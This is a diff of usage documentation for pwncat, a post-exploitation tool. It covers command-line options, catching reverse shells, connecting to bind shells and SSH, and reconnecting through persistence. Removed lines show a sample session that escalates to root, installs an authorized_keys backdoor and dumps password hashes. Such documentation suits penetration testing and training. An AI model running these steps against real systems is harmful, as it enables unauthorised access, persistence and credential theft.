@@ -33,116 +33,138 @@ press "C-k C-d" and to send "C-k" to the remote terminal, you can press "C-k C-k
 can be connected with any arbitrary script or local command and can be defined in the configuration file
 or with the ``bind`` command.
 
-Connecting to a remote host
----------------------------
+Command Line Interface and Start-up Sequence
+--------------------------------------------
 
-To connect to a remote host, the ``connect`` command is used. This command is capable of connecting
-to a remote host over a raw socket, SSH or view a previously installed persistence mechanism. It
-is also able to listen for reverse connections and initiate a session upon connection.
+The ``pwncat`` module installs a main script of the same name as an entry point to ``pwncat``. The
+command line parameters to this command are the same as that of the ``connect`` command. During startup,
+``pwncat`` will initialize an unconnected ``pwncat.victim`` object. It will then pass all arguments to
+the entrypoint on to the ``connect`` command. This command is capable of loading and executing a
+configuration script as well as connecting via various methods to a remote victim.
 
-When running ``pwncat``, all program arguments with the exception of the ``--config/-c`` and the
-``--help`` arguments are interpreted as local commands which will be executed after the configuration
-file is loaded.
+If a connection is not established during this initial connect command (for example, if the victim
+cannot be contacted or the ``--help`` parameter was specified), ``pwncat`` will then exit. If a
+connection *is* established, ``pwncat`` will enter the main Raw mode loop and provide you with
+a shell. At the time of writing, the available ``pwncat`` arguments are:
 
-Connecting can happen in your configuration file, from the command identified at command execution
-or after startup. If no connection is made from the configuration file or from your command line
-arguments, you will be placed in a local ``pwncat`` command prompt. This is a restricted prompt
-only allowing local commands to be run. From here, you can start a listener or connect to a remote
-host with the ``connect`` command.
+.. code-block::
+    :caption: pwncat argument help
 
-Here's an example of connecting to a remote bind shell on the host "test-host" on port 4444 immediately
-on invocation of ``pwncat``:
+    usage: pwncat [-h] [--exit] [--config CONFIG] [--listen] [--connect] [--ssh]
+                  [--reconnect] [--list] [--host HOST] [--port PORT] [--method METHOD]
+                  [--user USER] [--password PASSWORD] [--identity IDENTITY]
+
+    Connect to a remote host via SSH, bind/reverse shells or previous persistence methods
+    installed during past sessions.
+
+    optional arguments:
+      -h, --help            show this help message and exit
+      --exit                Exit if not connection is made
+      --config CONFIG, -C CONFIG
+                            Path to a configuration script to execute prior to connecting
+      --listen, -l          Listen for an incoming reverse shell
+      --connect, -c         Connect to a remote bind shell
+      --ssh, -s             Connect to a remote ssh server
+      --reconnect, -r       Reconnect to the given host via a persistence method
+      --list                List remote hosts with persistence methods installed
+      --host HOST, -H HOST  Address to listen on or remote host to connect to. For
+                            reconnections, this can be a host hash
+      --port PORT, -p PORT  The port to listen on or connect to
+      --method METHOD, -m METHOD
+                            The method to user for reconnection
+      --user USER, -u USER  The user to reconnect as; if this is a system method, this
+                            parameter is ignored.
+      --password PASSWORD, -P PASSWORD
+                            The password for the specified user for SSH connections
+      --identity IDENTITY, -i IDENTITY
+                            The private key for authentication for SSH connections
+
+
+Connection Methods
+------------------
+
+``pwncat`` is able to connect to a remote host in a few different ways. At it's core, ``pwncat`` communicates
+with a remote shell over a raw socket. This can be either a bind shell or a reverse shell from a remote victim
+host. ``pwncat`` also offerst the ability to connect to a remote victim over SSH with a known password or
+private key. When connecting via SSH, ``pwncat`` provides the same interface and capabilities as with a
+raw bind or reverse shell.
+
+The last connection method relies on a previous ``pwncat`` session with the victim. If you install a persistence
+method which support remote reconnection, ``pwncat`` can utilize this to initiate a new remote shell with the victim
+automatically. For example, if you installed authorized keys for a specific user, ``pwncat`` can utilize these to
+initiate another SSH session using your persistence. This allows you to easily reconnect in the event of a previous
+session being disconnected.
+
+Fully documentation on the methods and options for these connection methods can be found in the ``connect``
+documentation under the Command Index. A few examples of connections can be found below.
+
+Connecting to a victim bind shell
+---------------------------------
+
+In this case, the victim is running a raw bind shell on an open port. The victim must be available at an
+address which is routable (e.g. not NAT'd). The ``--connect/-c`` mode provides this capability.
 
 .. code-block:: bash
+    :caption: Connecting to a bind shell at 1.1.1.1:4444
 
-    pwncat connect --connect -H test-host -p 4444
+    pwncat --connect -H 1.1.1.1 -p 4444
 
-Similarly, listening for a reverse shell connection can be similarly accomplished:
+Catching a victim reverse shell
+-------------------------------
 
-.. code-block:: bash
-
-    pwncat connect --listen -H 0.0.0.0 -p 4444
-
-As mentioned above, if no connections are made during initialization, you will be taken to a local
-``pwncat`` prompt where you can then execute the ``connect`` command manually:
-
-.. code-block:: bash
-
-    $ pwncat
-    [?] no connection established, entering command mode
-
-    [+] local terminal restored
-    (local) pwncat$ connect -c -H test-host -p 4444
-    [+] connection to A.B.C.D:4444 established
-    [+] setting terminal prompt
-    [+] running in /bin/bash
-    [+] terminal state synchronized
-    [+] pwncat is ready 🐈
-
-    (remote) debian@debian-s-1vcpu-1gb-nyc1-01:/home/debian$
-
-The last method of connecting is via your configuration file. You can place the ``connect`` command
-there in order to not require any arguments. More powerfully, you can place your **reconnect**
-command in your configuration file, which will fail the first time you connect to the remote host.
-After installing persistence, reconnection will utilize your persistence to gain a shell and you
-will no longer need command line parameters.
+In this case, the victim was exploited in such a way that they open a connection to your attacking host
+on a specific port with a raw shell open on the other end. Your attacking host must be routable from the
+victim machine. This mode is accessed via the ``--listen/-l`` option for connect.
 
 .. code-block:: bash
+    :caption: Catching a reverse shell
 
-    # your pwncat configuration script
-    set db "sqlite:///pwncat.sqlite"
-    connect --reconnect -H test-host
+    pwncat --listen -p 4444
+
+Connecting to a Remote SSH Server
+---------------------------------
+
+If you were able to obtain a valid password or private key for a remote user, you can initiate a ``pwncat``
+session with the remote host over SSH. This mode is accessed via the ``--ssh/-s`` option for connect.
 
 .. code-block:: bash
+    :caption: Connection to a remote SSH server w/ Password Auth
 
-    # Connect to test-host via reverse shell the first time
-    $ pwncat -c pwncatrc connect -l -H 0.0.0. -p 4444
-    [!] d87b9646813d250ac433decdee70112a: connection failed: no working persistence methods found
-    [+] connection to A.B.C.D:4444 established
-    [+] setting terminal prompt
-    [+] running in /bin/bash
-    [+] terminal state synchronized
-    [+] pwncat is ready 🐈
+    pwncat -s -H 1.1.1.1 -u root -p "r00t5P@ssw0rd"
 
-    (remote) debian@debian-s-1vcpu-1gb-nyc1-01:/root$
-    [+] local terminal restored
-    (local) pwncat$ privesc -e
-    [+] privilege escalation succeeded using:
-     ⮡ shell as root via /bin/bash (sudo NOPASSWD)
-    [+] pwncat is ready 🐈
+.. code-block:: bash
+    :caption: Connection to a remote SSH server w/ Public Key Auth
 
-    (remote) root@debian-s-1vcpu-1gb-nyc1-01:~#
-    [+] local terminal restored
-    (local) pwncat$ persist -i -m authorized_keys -u root
-    (local) pwncat$ persist --status
-     - authorized_keys as root (local) installed
-    (local) pwncat$
-    [+] pwncat is ready 🐈
+    pwncat -s -H 1.1.1.1 -u root -i ./root-private-key
 
-    (remote) root@debian-s-1vcpu-1gb-nyc1-01:~#
+Reconnecting to a victim
+------------------------
 
-    exit
-    (remote) debian@debian-s-1vcpu-1gb-nyc1-01:/root$
-    (remote) debian@debian-s-1vcpu-1gb-nyc1-01:/root$
+If you previously had a ``pwncat`` session with a remote host and installed a persistence mechanism, you may
+be able to leverage ``pwncat`` to automatically reconnect to the victim host utilizing your persistence
+machanism. For this to work, you must specify a configuration file which provides a database for ``pwncat``
+to use. With a configuration file specified, you can use the ``--list`` argument to list known hosts and
+their associated persistence methods.
 
-    exit
+.. code-block:: bash
+    :caption: Listing known host/persistence combinations
 
-    [+] local terminal restored
+    pwncat -C data/pwncatrc --list
+    1.1.1.1 - "centos" - 999c434fe6bd7383f1a6cc10f877644d
+      - authorized_keys as root
 
-    $ pwncat -c data/pwncatrc
-    [+] setting terminal prompt
-    [+] running in /bin/bash
-    [+] terminal state synchronized
-    [+] pwncat is ready 🐈
-    (remote) root@debian-s-1vcpu-1gb-nyc1-01:~#
-    (remote) root@debian-s-1vcpu-1gb-nyc1-01:~#
-    [+] local terminal restored
-    (local) pwncat$ hashdump
-    root:$6$jmqmNYe9$8GJjU.tV5XWfyFMclJXd0f7TOCEuHbvU9ajD8ZeaVd7y7GGXcb7BfNVV6rR/S6AcmI0W.yzHiXId0EZsYgnQx1
-    debian:$6$c5h8DDIk$2bxaEK8C.wCkTwY.z/Z4c48RwdLRL5AE5J6qvPPHCz2vPb2dEeIbwtxkTHHbvTcnh1S/J0e2gPxUiRgT9SiXN/
-    (local) pwncat$
+Each host is identified by a host hash as seen above. You can reconnect to a host by either specifying a host
+hash or an IP address. If multiple hosts share the same IP address, the first in the database will be selected
+if you specify an IP address. Host hashes are unique across hosts.
 
-The first time ``pwncat`` was run, the reconnection command failed. This was expected, since we
-had not connected to the remote host yet. After we escalated privileges, and installed persistence,
-we were able to re-run ``pwncat`` with no arguments and get a shell. In this case, ``pwncat``
-utilized our installed ssh authorized keys backdoor to gain a session as the root user.
+.. code-block:: bash
+    :caption: Reconnecting to a known host
+
+    # Reconnect w/ host hash
+    pwncat -C data/pwncatrc --reconnect -H 999c434fe6bd7383f1a6cc10f877644d
+    # Reconnect to first host w/ matching IP
+    pwncat -C data/pwncatrc --reconnect -H 1.1.1.1
+
+Other options are available to specify methods or users to reconnect with. These options are covered in more detail
+in the ``connect`` documentation under the Command Index.
+
